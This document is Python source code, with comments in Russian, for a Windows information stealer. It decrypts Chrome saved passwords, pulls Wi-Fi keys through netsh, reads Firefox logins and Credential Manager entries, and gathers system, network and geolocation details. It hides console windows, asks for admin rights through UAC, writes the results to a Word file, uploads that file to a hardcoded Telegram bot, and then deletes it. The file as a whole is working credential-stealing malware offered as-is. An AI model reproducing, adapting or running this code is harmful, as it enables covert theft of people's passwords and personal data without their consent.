import platform
import socket
import uuid
import psutil
import wmi
import datetime
import requests
import getpass
import os
import subprocess
from winreg import ConnectRegistry, OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx, EnumKey, CloseKey
import win32net
import ctypes
from docx import Document
import sys
import time
import sqlite3
import win32crypt
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import json

# Telegram API данные
TELEGRAM_CONFIG = {
    "CHAT_ID": "-4619435951",
    "BOT_TOKEN": "6871167004:AAG63-lwqImzNoWPP8Siq6ZFRSfC5GxF-vk",
}
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_CONFIG['BOT_TOKEN']}/sendDocument"

# Флаг для скрытия консоли при выполнении команд (только для Windows)
CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW

def run_command(args, shell=False):
    """Выполнение команды с скрытой консолью."""
    try:
        output = subprocess.check_output(
            args,
            stderr=subprocess.STDOUT,
            shell=shell,
            creationflags=CREATE_NO_WINDOW
        )
        return output.decode("utf-8", errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", errors="ignore")
    except Exception as e:
        return str(e)

def is_admin():
    try:
        run_command("net session", shell=True)
        print("Admin rights confirmed via 'net session'.")
        return True
    except subprocess.CalledProcessError:
        print("Admin rights check failed via 'net session'.")
        return False
    except Exception as e:
        print(f"Admin rights check error: {e}")
        return False

def restart_as_admin():
    script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    try:
        print(f"Attempting to restart with admin rights: {script_path}")
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script_path}"', None, 1
        )
        if result <= 32:
            print(f"Failed to restart as admin. Return code: {result}")
            return False
        print("UAC prompt displayed. Awaiting confirmation...")
        time.sleep(2)
        sys.exit(0)
    except Exception as e:
        print(f"Restart as admin failed: {e}")
        return False

def get_cpu_temperature():
    try:
        w = wmi.WMI(namespace="root\\OpenHardwareMonitor")
        for sensor in w.Sensor():
            if sensor.SensorType == "Temperature" and "CPU" in sensor.Name:
                return f"{sensor.Value}°C"
        return "Not detected"
    except Exception as e:
        return f"Failed to retrieve: {e}"

def get_gpu_info():
    try:
        w = wmi.WMI()
        gpus = w.Win32_VideoController()
        gpu_list = []
        for gpu in gpus:
            memory = f"{gpu.AdapterRAM // (1024 ** 2)} MB" if gpu.AdapterRAM else "Not available"
            gpu_list.append(f"Name: {gpu.Name}, Memory: {memory}")
        print(f"Detected GPUs: {gpu_list}")
        return gpu_list if gpu_list else ["None found"]
    except Exception as e:
        return [f"Failed to retrieve (error: {e})"]

def get_wifi_info():
    info = {}
    if not is_admin():
        return {"Wi-Fi Info": "Admin rights required to access Wi-Fi information."}
    
    interfaces_output = run_command(["netsh", "wlan", "show", "interfaces"])
    ssid = None
    for line in interfaces_output.splitlines():
        if "SSID" in line and "BSSID" not in line:
            parts = line.split(":", 1)
            if len(parts) > 1:
                ssid = parts[1].strip()
                break
    info["Current Wi-Fi SSID"] = ssid if ssid else "Not connected"
    
    profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
    if ssid:
        if ssid not in profiles_output:
            info["Wi-Fi Password"] = f"Profile for SSID '{ssid}' not found."
        else:
            password_output = run_command(["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"])
            password = None
            for line in password_output.splitlines():
                for label in ["Key Content", "Содержимое ключа"]:
                    if label in line:
                        parts = line.split(":", 1)
                        if len(parts) > 1:
                            password = parts[1].strip()
                            break
                if password:
                    break
            info["Wi-Fi Password"] = password if password else "Key content not found."
    else:
        info["Wi-Fi Password"] = "N/A"
    
    profiles_list = [line.split(":", 1)[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]
    info["Known Wi-Fi Networks"] = profiles_list if profiles_list else ["None found"]
    return info

def get_bios_info():
    try:
        bios = wmi.WMI().Win32_BIOS()[0]
        return [
            f"Manufacturer: {bios.Manufacturer}",
            f"Name: {bios.Name}",
            f"Version: {bios.Version}",
            f"Serial Number: {bios.SerialNumber}",
            f"Release Date: {bios.ReleaseDate[:4]}-{bios.ReleaseDate[4:6]}-{bios.ReleaseDate[6:8]}"
        ]
    except Exception as e:
        print(f"BIOS info error: {e}")
        return [f"Failed to retrieve (error: {e})"]

def get_motherboard_info():
    try:
        board = wmi.WMI().Win32_BaseBoard()[0]
        return [
            f"Manufacturer: {board.Manufacturer}",
            f"Product: {board.Product}",
            f"Serial Number: {board.SerialNumber}"
        ]
    except Exception as e:
        print(f"Motherboard info error: {e}")
        return [f"Failed to retrieve (error: {e})"]

def get_cpu_detailed_info():
    try:
        cpus = wmi.WMI().Win32_Processor()
        info = []
        for cpu in cpus:
            info.extend([
                f"Name: {cpu.Name}",
                f"Cores: {cpu.NumberOfCores}",
                f"Max Clock: {cpu.MaxClockSpeed} MHz",
                f"Current Clock: {cpu.CurrentClockSpeed} MHz",
                f"Socket: {cpu.SocketDesignation}"
            ])
        return info if info else ["None found"]
    except Exception as e:
        print(f"CPU detailed info error: {e}")
        return [f"Failed to retrieve (error: {e})"]

def get_services():
    services = []
    for service in psutil.win_service_iter():
        try:
            services.append(f"Name: {service.name()}, Status: {service.status()}")
        except Exception:
            continue
    return services if services else ["None found"]

def get_drivers():
    try:
        drivers = [f"Name: {driver.Name}, State: {driver.State}" for driver in wmi.WMI().Win32_SystemDriver()]
        return drivers if drivers else ["None found"]
    except Exception:
        return ["Failed to retrieve"]

def get_usb_devices():
    try:
        devices = [f"Name: {usb.Description}" for usb in wmi.WMI().Win32_USBHub()]
        return devices if devices else ["None found"]
    except Exception:
        return ["Failed to retrieve"]

def get_installed_programs():
    programs = []
    try:
        reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        for key_path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                         r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                key = OpenKey(reg, key_path)
            except Exception as e:
                print(f"Registry key {key_path} access error: {e}")
                continue
            i = 0
            while True:
                try:
                    subkey_name = EnumKey(key, i)
                    subkey = OpenKey(key, subkey_name)
                    try:
                        name = QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"Program: {name}")
                    except FileNotFoundError:
                        pass
                    finally:
                        CloseKey(subkey)
                    i += 1
                except OSError:
                    break
            CloseKey(key)
        CloseKey(reg)
    except Exception as e:
        print(f"Installed programs error: {e}")
    return programs if programs else ["None found"]

def get_geolocation():
    for url in ["http://ip-api.com/json/", "https://ipinfo.io/json"]:
        try:
            response = requests.get(url, timeout=10)
            data = response.json()
            if data.get("status", "success") == "success" or url.endswith("ipinfo.io/json"):
                return {
                    "Country": data.get("country", "Unknown"),
                    "Region": data.get("regionName", data.get("region", "Unknown")),
                    "City": data.get("city", "Unknown"),
                    "ISP": data.get("isp", data.get("org", "Unknown")),
                    "Lat/Lon": f"{data.get('lat', 'Unknown')}, {data.get('lon', data.get('loc', 'Unknown'))}"
                }
        except Exception:
            continue
    return {"Geolocation": "Failed to retrieve"}

def get_environment_vars():
    return [
        f"PATH: {os.environ.get('PATH', 'Not found')}",
        f"USERNAME: {os.environ.get('USERNAME', 'Not found')}",
        f"USERPROFILE: {os.environ.get('USERPROFILE', 'Not found')}"
    ]

def get_local_users():
    try:
        users = win32net.NetUserEnum(None, 1, 0)[0]
        return [f"User: {user['name']}" for user in users] if users else ["None found"]
    except Exception:
        return ["Failed to retrieve users"]

def get_local_groups():
    try:
        groups = win32net.NetLocalGroupEnum(None, 0)[0]
        return [f"Group: {group['name']}" for group in groups] if groups else ["None found"]
    except Exception:
        return ["Failed to retrieve groups"]

def get_chrome_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Chrome encryption key error: {e}")
        return None

def decrypt_chrome_password(encrypted_password, key):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode("utf-8")
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
    except Exception as e:
        return f"Failed to decrypt (error: {e})"

def get_chrome_passwords():
    chrome_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(chrome_db):
        return ["Chrome passwords: Database not found"]
    temp_db = "LoginData_temp"
    try:
        shutil.copyfile(chrome_db, temp_db)
        key = get_chrome_encryption_key()
        if not key:
            return ["Chrome passwords: Failed to retrieve encryption key"]
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            if url and username and encrypted_password:
                password = decrypt_chrome_password(encrypted_password, key)
                passwords.append(f"URL: {url}, Username: {username}, Password: {password}")
        conn.close()
        os.remove(temp_db)
        return passwords if passwords else ["Chrome passwords: None found"]
    except Exception as e:
        return [f"Chrome passwords: Failed to retrieve (error: {e})"]

def get_firefox_passwords():
    firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(firefox_profiles_path):
        return ["Firefox passwords: Profile not found"]
    passwords = []
    for profile in os.listdir(firefox_profiles_path):
        profile_path = os.path.join(firefox_profiles_path, profile)
        logins_file = os.path.join(profile_path, "logins.json")
        if os.path.exists(logins_file):
            try:
                with open(logins_file, 'r') as f:
                    data = json.load(f)
                for login in data.get("logins", []):
                    url = login.get("hostname", "Unknown")
                    username = login.get("encryptedUsername", "")
                    password = login.get("encryptedPassword", "")
                    passwords.append(f"URL: {url}, Username: {username} (encrypted), Password: {password} (encrypted)")
            except Exception as e:
                passwords.append(f"Firefox passwords: Error reading logins (error: {e})")
    return passwords if passwords else ["Firefox passwords: None found"]

def get_credential_manager_passwords():
    try:
        output = run_command("cmdkey /list", shell=True)
        credentials = []
        current_target = None
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("Target:"):
                current_target = line.split("Target:", 1)[1].strip()
            elif line.startswith("User:") and current_target:
                username = line.split("User:", 1)[1].strip()
                credentials.append(f"Target: {current_target}, Username: {username}, Password: Not accessible")
        return credentials if credentials else ["Credential Manager: None found"]
    except Exception as e:
        return [f"Credential Manager: Failed to retrieve (error: {e})"]

def collect_all_info():
    info = {
        "System Info": {
            "Computer Name": platform.node(),
            "Username": getpass.getuser(),
            "OS": platform.platform(),
            "OS Version": f"{platform.win32_ver()[0]} {platform.win32_ver()[1]}",
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "Python Version": platform.python_version(),
            "System Language": platform.win32_ver()[2],
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%d/%m/%Y %H:%M:%S")
        },
        "CPU Info": get_cpu_detailed_info(),
        "GPU Info": get_gpu_info(),
        "Network Info": {
            "Local IP": socket.gethostbyname(socket.gethostname()),
            "MAC Address": ':'.join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 8*6, 8)[::-1]),
            "Hostname": socket.gethostname()
        },
        "Geolocation": get_geolocation(),
        "Wi-Fi Info": get_wifi_info(),
        "Hardware Info": {
            "Total Memory (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
            "Available Memory (GB)": round(psutil.virtual_memory().available / (1024 ** 3), 2),
            "Disk Usage": [f"{disk.device}: Total: {round(psutil.disk_usage(disk.mountpoint).total / (1024 ** 3), 2)} GB, Free: {round(psutil.disk_usage(disk.mountpoint).free / (1024 ** 3), 2)} GB" for disk in psutil.disk_partitions(all=False)]
        },
        "Battery Info": (
            ["Percent: " + (f"{psutil.sensors_battery().percent}%" if psutil.sensors_battery() else "Not detected"),
             "Plugged: " + ("Yes" if psutil.sensors_battery() and psutil.sensors_battery().power_plugged else "No" if psutil.sensors_battery() else "N/A"),
             "Time Left: " + (f"{psutil.sensors_battery().secsleft // 3600}h {(psutil.sensors_battery().secsleft % 3600) // 60}m" if psutil.sensors_battery() and psutil.sensors_battery().secsleft != psutil.POWER_TIME_UNLIMITED else "Unlimited" if psutil.sensors_battery() else "N/A")]
            if psutil.sensors_battery() else ["Battery: Not detected"]
        ),
        "Screen Resolution": f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}",
        "BIOS Info": get_bios_info(),
        "Motherboard Info": get_motherboard_info(),
        "Installed Programs": get_installed_programs(),
        "Services": get_services(),
        "Drivers": get_drivers(),
        "USB Devices": get_usb_devices(),
        "Environment Variables": get_environment_vars(),
        "Local Users": get_local_users(),
        "Local Groups": get_local_groups(),
        "Saved Passwords": {
            "Chrome Passwords": get_chrome_passwords(),
            "Firefox Passwords": get_firefox_passwords(),
            "Credential Manager": get_credential_manager_passwords()
        },
        "DateTime": datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    }
    return info

def create_word_file(info, filename):
    doc = Document()
    doc.add_heading("User Data Report", 0)
    for section, data in info.items():
        doc.add_heading(section, level=1)
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, dict):
                    doc.add_paragraph(f"{key}:")
                    for sub_key, sub_value in value.items():
                        if isinstance(sub_value, list):
                            doc.add_paragraph(f"  {sub_key}:")
                            for item in sub_value:
                                doc.add_paragraph(f"    {item}", style='List Bullet')
                        else:
                            doc.add_paragraph(f"  {sub_key}: {sub_value}", style='List Bullet')
                    doc.add_paragraph("")
                elif isinstance(value, list):
                    doc.add_paragraph(f"{key}:")
                    for item in value:
                        doc.add_paragraph(f"  {item}", style='List Bullet')
                    doc.add_paragraph("")
                else:
                    doc.add_paragraph(f"{key}: {value}", style='List Bullet')
                    doc.add_paragraph("")
        elif isinstance(data, list):
            for item in data:
                doc.add_paragraph(item, style='List Bullet')
                doc.add_paragraph("")
        else:
            doc.add_paragraph(f"{section}: {data}", style='List Bullet')
            doc.add_paragraph("")
    doc.save(filename)
    return filename

def send_file_to_telegram(file_path):
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(
                TELEGRAM_API_URL,
                data={'chat_id': TELEGRAM_CONFIG["CHAT_ID"]},
                files={'document': file},
                timeout=10
            )
        if response.status_code == 200:
            print("File sent successfully!")
        else:
            print(f"Failed to send file. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending file: {e}")

def main():
    if not is_admin():
        print("Script not running as admin. Restarting...")
        if not restart_as_admin():
            print("Automatic restart failed. Please run as administrator.")
            sys.exit(1)
    
    info = collect_all_info()
    username = getpass.getuser()
    computer_name = platform.node()
    # Фиксированный формат - только Word (docx)
    filename = f"{username}_{computer_name}.docx"
    file_path = os.path.join(os.environ["APPDATA"], filename)
    
    create_word_file(info, file_path)
    send_file_to_telegram(file_path)
    
    try:
        os.remove(file_path)
        print(f"File {file_path} sent and deleted.")
    except Exception as e:
        print(f"Error deleting file: {e}")

if __name__ == "__main__":
    main()
